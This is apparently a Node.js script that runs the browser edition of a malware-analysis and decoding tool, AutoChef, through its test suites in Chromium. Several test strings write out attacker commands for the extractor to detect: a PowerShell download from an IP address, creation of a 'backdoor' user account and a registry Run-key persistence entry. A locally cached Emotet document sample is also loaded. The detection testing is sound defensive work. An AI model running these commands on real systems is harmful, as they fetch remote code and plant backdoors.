/**
 * Runs AutoChef's test suites against the BROWSER EDITION (web/), inside Chromium, so the
 * online version is measured on the same cases as the local version.
 *
 *   node scripts/build-web.mjs                    (build web/ first)
 *   node test/browser/run-browser.mjs [typical|features|ui|advanced|all] [N]
 */
import http from "node:http";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync, spawnSync, spawn } from "node:child_process";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const WEB = path.join(ROOT, "web");
const { chromium } = createRequire(import.meta.url)("playwright");
const suite = process.argv[2] || "all", N = Number(process.argv[3]) || null;
if (!fs.existsSync(path.join(WEB, "autochef.js"))) execFileSync(process.execPath, [path.join(ROOT, "scripts", "build-web.mjs")], { stdio: "inherit" });

// static server, like GitHub Pages
const T = { ".html": "text/html", ".js": "text/javascript", ".json": "application/json", ".wasm": "application/wasm", ".png": "image/png", ".webmanifest": "application/manifest+json", ".txt": "text/plain" };
const server = http.createServer((q, r) => { let p = path.join(WEB, decodeURIComponent(q.url.split("?")[0])); if (p.endsWith(path.sep) || p.endsWith("/")) p = path.join(p, "index.html"); fs.readFile(p, (e, d) => { if (e) { r.writeHead(404); return r.end(); } r.writeHead(200, { "Content-Type": T[path.extname(p)] || "application/octet-stream" }); r.end(d); }); });
await new Promise(r => server.listen(0, "127.0.0.1", r));
const URL_ = `http://127.0.0.1:${server.address().port}/`;
console.log(`browser edition served at ${URL_}`);

const browser = await chromium.launch();
const page = await browser.newPage();
page.on("pageerror", e => console.log("pageerror:", e.message));
await page.goto(URL_);
await page.waitForFunction(() => window.AutoChef, null, { timeout: 60000 });
const run = (b64, opts) => page.evaluate(async ([b, o]) => {
    const bin = atob(b), u = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
    const r = await window.AutoChef.autoChef(u, o);
    return { results: r.results.map(x => ({ recipe: x.recipe, output: { base64: x.output.base64, preview: x.output.preview } })), hash: r.hash, assessment: r.assessment, alertSummary: r.alertSummary, ms: r.stats?.ms };
}, [b64, opts]);

const summary = {};
if (suite === "typical" || suite === "all") {
    const { CASES, judge } = await import("../typical/run-typical.mjs");
    let t1 = 0, t5 = 0;
    for (const c of CASES) { const res = await run(Buffer.from(c.input).toString("base64"), { timeBudgetMs: 12000, maxResults: 5, keys: c.keys || [] }); const [a, b] = judge(c, res); t1 += a; t5 += b; if (!b) console.log("  typical miss:", c.name); }
    summary.typical = `${t1}/${CASES.length} top-1, ${t5}/${CASES.length} top-5`;
    console.log("typical:", summary.typical);
}
if (suite === "features" || suite === "all") {
    // the engine-side feature checks that make sense in a page (no Python reference tools here)
    const r = await page.evaluate(async () => {
        const A = window.AutoChef, out = [];
        const ok = (n, c) => out.push([n, !!c]);
        ok("crypto vectors (BTC, bech32, EIP-55, CashAddr, Monero, XRP, Stellar)", ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4", "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe", "bitcoincash:qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a", "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A", "rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh", "GAAZI4TCR3TY5OJHCTJC2A4QSY6CJWJH5IAJTGKIN2ER7LBNVKOCCWN7"].every(a => A.cryptoAddresses(a).some(x => x.address === a)));
        ok("wrong checksums rejected", !A.cryptoAddresses("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb 0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAE").length);
        const F = A.extractFindings("powershell.exe iwr http://198.51.100.7/a.ps1; net user backdoor x /add; +44 20 7946 0958 Germany 1234567890:AAH9xk2PqL5mZ0vT7bW3cR8sD1fG6jN4eYu");
        ok("findings incl. phone, country, plugin token", ["URL", "Process", "User name", "Landline", "Country", "Telegram bot token"].every(t => F.some(f => f.type === t)));
        const an = await A.autoChef(new TextEncoder().encode(btoa("iwr http://198.51.100.7/a.ps1; reg add HKCU\\Software\\Run /v x")), { timeBudgetMs: 4000 });
        for (const f of ["stix", "misp", "sigma", "yara", "md", "csv"]) ok(`export ${f} built`, A.buildReport({ name: "s", bytes: new Uint8Array(4), analysis: an }, f).length > 50);
        ok("ransom: ordinary text is not a note", A.identifyRansom("An ordinary README describing how to build and test this project. Nothing else is in it at all.") === null);
        const lib = await (await fetch("/api/team-library", { method: "POST", body: JSON.stringify({ name: "t", recipe: [{ op: "From Base64", args: ["A-Za-z0-9+/=", true, false] }] }) })).json();
        const listed = (await (await fetch("/api/team-library")).json()).entries.some(e => e.id === lib.entry.id);
        await fetch("/api/team-library?id=" + lib.entry.id, { method: "DELETE" });
        ok("team library in localStorage: save, list, delete", listed && !(await (await fetch("/api/team-library")).json()).entries.length);
        const ai = await (await fetch("/api/ai/status")).json();
        ok("AI providers listed", ai.providers.length >= 10);
        return out;
    });
    // real Office sample and real PE, when available locally
    const extra = [];
    const CACHE = path.join(ROOT, "test", "realworld", ".cache", "cyberchef-recipes", "source_files", "recipe_33.zip");
    if (fs.existsSync(CACHE)) {
        const { ZipReader, BlobReader, Uint8ArrayWriter } = await import("@zip.js/zip.js");
        const ents = await new ZipReader(new BlobReader(new Blob([fs.readFileSync(CACHE)])), { password: "infected" }).getEntries();
        const doc = Buffer.from(await ents.find(e => /\.doc$/.test(e.filename)).getData(new Uint8ArrayWriter()));
        const n = await page.evaluate(async b => { const bin = atob(b), u = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i); const x = await window.AutoChef.extractOffice(u); return x.modules.length; }, doc.toString("base64"));
        extra.push(["office: Emotet .doc macros extracted in the browser", n === 3]);
    }
    const pe = process.env.AUTOCHEF_TEST_PE || "/tmp/pe/putty.exe";
    if (fs.existsSync(pe)) {
        const { analyzePE } = await import("../../src/pe.mjs");
        const local = analyzePE(fs.readFileSync(pe)).imphash;
        const web = await page.evaluate(b => { const bin = atob(b), u = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i); return window.AutoChef.analyzePE(u).imphash; }, fs.readFileSync(pe).toString("base64"));
        extra.push(["pe: imphash identical to the local version", web === local]);
    }
    // the exports built in the page, checked by the reference libraries (when Python has them)
    const exp = await page.evaluate(async () => { const A = window.AutoChef; const an = await A.autoChef(new TextEncoder().encode(btoa("powershell.exe iwr http://198.51.100.7/a.ps1; reg add HKCU\\Software\\Run /v x; 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")), { timeBudgetMs: 4000 }); return Object.fromEntries(["stix", "misp", "sigma", "yara"].map(f => [f, A.buildReport({ name: "s.txt", bytes: new Uint8Array(8), analysis: an }, f)])); });
    const checks = { stix: ["stix2", "import stix2,sys; stix2.parse(open(sys.argv[1]).read(), allow_custom=False)"], misp: ["pymisp", "import sys; from pymisp import MISPEvent; e=MISPEvent(); e.load_file(sys.argv[1])"], sigma: ["sigma", "import sys; from sigma.collection import SigmaCollection; SigmaCollection.from_yaml(open(sys.argv[1]).read())"], yara: ["yara", "import yara,sys; yara.compile(sys.argv[1])"] };
    for (const [f, [mod, code]] of Object.entries(checks)) {
        const file = path.join(os.tmpdir(), `autochef-web-${process.pid}.${f}`);
        fs.writeFileSync(file, exp[f]);
        const r2 = spawnSync("python3", ["-c", code, file]);
        if (r2.error || (r2.status !== 0 && /No module named/.test(String(r2.stderr)))) console.log(`SKIP  export ${f} (python ${mod} not installed)`);
        else extra.push([`export ${f} built in the browser accepted by ${mod}`, r2.status === 0]);
    }
    const all = [...r, ...extra];
    for (const [n, c] of all) console.log(`${c ? "PASS" : "FAIL"}  ${n}`);
    summary.features = `${all.filter(x => x[1]).length}/${all.length}`;
}
if (suite === "advanced" || suite === "all") {
    const tmp = path.join(os.tmpdir(), `autochef-adv-cases-${process.pid}.json`);
    spawnSync(process.execPath, [path.join(ROOT, "test", "advanced", "run-advanced.mjs"), "all"], { env: { ...process.env, DUMP: tmp }, stdio: "inherit" });
    let cases = JSON.parse(fs.readFileSync(tmp, "utf8"));
    if (N) cases = cases.slice(0, N);
    const norm = s => s.replace(/\s+/g, " ").trim(), lossyNorm = s => s.toUpperCase().replace(/[^A-Z0-9]/g, "");
    const st = {}, miss = {};
    if (process.env.ONLY) cases = cases.filter(c => process.env.ONLY.split(",").includes(c.suite));
    const t0 = Date.now();
    for (const [i, c] of cases.entries()) {
        const res = await run(c.input, { timeBudgetMs: 12000, maxResults: 5, keys: c.keys || [] });
        const outs = res.results.map(r => r.output.base64 ? Buffer.from(r.output.base64, "base64").toString("latin1") : (r.output.preview || ""));
        const hit = o => c.lossy ? lossyNorm(o).includes(c.needle) : norm(o).includes(c.needle);
        const k = c.suite === "layers" ? "layers" : c.suite;
        const s = st[k] ||= { n: 0, t1: 0, t5: 0 };
        s.n++; s.t1 += !!outs[0] && hit(outs[0]); s.t5 += outs.some(hit);
        if (!outs.some(hit)) (miss[c.suite === "layers" ? `layers (${c.label.split(" > ").length})` : `${c.suite}: ${c.label.split(" > ")[0]}`] ||= []).push(res.ms);
        if ((i + 1) % 100 === 0) console.log(`${i + 1}/${cases.length} (${Math.round((Date.now() - t0) / 1000)} s)`);
    }
    const T1 = Object.values(st).reduce((a, s) => a + s.t1, 0), T5 = Object.values(st).reduce((a, s) => a + s.t5, 0);
    summary.advanced = `${T1}/${cases.length} top-1 (${(100 * T1 / cases.length).toFixed(1)} %), ${T5}/${cases.length} top-5 (${(100 * T5 / cases.length).toFixed(1)} %); ` + Object.entries(st).map(([k, s]) => `${k} ${s.t1}/${s.t5}/${s.n}`).join(", ");
    console.log("advanced:", summary.advanced);
    console.log("misses by group:", JSON.stringify(Object.fromEntries(Object.entries(miss).map(([k, v]) => [k, v.length]))));
    fs.rmSync(tmp, { force: true });
}
await browser.close();
if (suite === "ui" || suite === "all") {
    // async: this process also serves the site, so it must not block
    const out = await new Promise(res => { const ch = spawn(process.execPath, [path.join(ROOT, "test", "ui", "editor.spec.mjs")], { env: { ...process.env, AUTOCHEF_URL: URL_ } }); let o = ""; ch.stdout.on("data", d => { o += d; process.stdout.write(d); }); ch.on("close", () => res(o)); });
    summary.ui = (out.match(/(\d+) passed, (\d+) failed/) || [""])[0];
}
server.close();
console.log("\nBROWSER EDITION SUMMARY", JSON.stringify(summary, null, 1));
process.exit(0);
